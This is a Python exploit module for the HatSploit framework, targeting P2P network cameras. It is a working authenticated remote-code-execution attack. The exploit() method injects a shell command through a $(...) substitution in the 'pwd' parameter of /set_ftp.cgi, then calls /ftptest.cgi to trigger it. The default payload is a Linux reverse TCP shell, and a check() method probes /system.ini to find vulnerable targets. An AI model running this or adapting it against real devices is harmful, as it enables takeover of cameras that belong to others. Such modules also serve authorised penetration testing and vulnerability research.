"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import HTTP

from pex.string import String


class HatSploitModule(Module, HTTP, Handler, String):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "P2P Camera Authenticated RCE",
            'Module': "exploit/linux/generic/p2p_authenticated_rce",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Pierre Kim (pierrekim) - vulnerability researcher',
            ],
            'Description': "P2P network camera authenticated remote code execution.",
            'Platform': OS_LINUX,
            'Rank': "high",
            'Payload': {
                'Value': "linux/x64/shell_reverse_tcp",
                'Arches': [ARCH_MIPSLE, ARCH_MIPSBE, ARCH_GENERIC],
                'Platforms': [OS_LINUX, OS_UNIX],
            }
        })

        self.username = Option(None, "Username for authentication.", True)
        self.password = Option(None, "Password for authentication.", True)

    def exploit(self, command):
        self.http_request(
            method="GET",
            path=(
                f'/set_ftp.cgi?next_url=ftp.htm&loginuse={self.username.value}&loginpas={self.password.value}'
                f'&svr=192.168.1.1&port=21&user=ftp&pwd=$({command})&dir=/&mode=PORT&upload_interval=0'
            ),
        )

        self.http_request(
            method="GET",
            path=(
                f'/ftptest.cgi?next_url=test_ftp.htm&loginuse={self.username.value}&loginpas={self.password.value}'
            ),
        )

    def check(self):
        response = self.http_request(
            method="GET",
            path="/system.ini?loginuse&loginpas",
        )

        if response is None or response.status_code != 200:
            return False

        return True

    def run(self):
        self.module_handle(
            method="echo",
            sender=self.exploit,
        )
